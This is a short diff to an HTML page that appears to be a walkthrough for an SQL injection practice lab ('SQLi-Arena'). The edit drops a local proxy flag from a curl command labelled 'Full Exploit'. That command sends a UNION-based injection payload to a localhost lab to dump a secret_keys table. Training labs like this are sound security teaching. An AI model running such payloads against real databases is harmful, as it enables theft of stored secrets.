@@ -121,7 +121,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab1" \<br> --data-urlencode "title=zzz' UNION SELECT id, key_name, key_value FROM secret_keys -- -"
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab1" \<br> --data-urlencode "title=zzz' UNION SELECT id, key_name, key_value FROM secret_keys -- -"
     </div>
 </div>
 
